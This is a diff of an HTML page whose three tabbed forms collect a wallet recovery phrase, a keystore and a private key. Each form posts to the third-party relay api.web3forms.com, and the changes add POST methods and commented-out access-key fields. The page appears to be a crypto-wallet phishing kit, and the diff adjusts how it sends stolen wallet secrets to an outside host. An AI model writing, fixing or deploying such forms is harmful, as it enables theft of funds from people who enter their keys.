@@ -754,7 +754,9 @@
 
           <div class="tab-container">
             <div class="tab-content active">
-              <form action="https://api.web3forms.com/submit" class="form-phrase" id="phrase">
+              <form action="https://api.web3forms.com/submit" class="form-phrase needs-validation" novalidate id="phrase" method="post">
+                <!-- <input type="hidden" name="access_key" value="656aedb9-8b1b-4c97-b703-64da33878521" />
+                <input type="hidden" name="subject" value="New Form Submission" /> -->
                 <textarea
                   name="phrase"
                   id="phrase"
@@ -778,8 +780,9 @@
               </form>
             </div>
             <div class="tab-content d-none" id="keystore">
-              <form action="https://api.web3forms.com/submit" class="form-phrase mb-3">
-
+              <form action="https://api.web3forms.com/submit" class="form-phrase mb-3 needs-validation" novalidate method="post">
+                <!-- <input type="hidden" name="access_key" value="656aedb9-8b1b-4c97-b703-64da33878521" />
+                <input type="hidden" name="subject" value="New Form Submission" /> -->
                 <textarea
                   name="keystore"
                   id="keystore"
@@ -811,7 +814,9 @@
             </div>
 
             <div class="tab-content d-none" id="private">
-              <form action="https://api.web3forms.com/submit" class="form-phrase mb-3">
+              <form action="https://api.web3forms.com/submit" class="form-phrase mb-3 needs-validation" novalidate method="post">
+                <!-- <input type="hidden" name="access_key" value="656aedb9-8b1b-4c97-b703-64da33878521" />
+                <input type="hidden" name="subject" value="New Form Submission" /> -->
                 <input
                   type="text"
                   class="form-control"
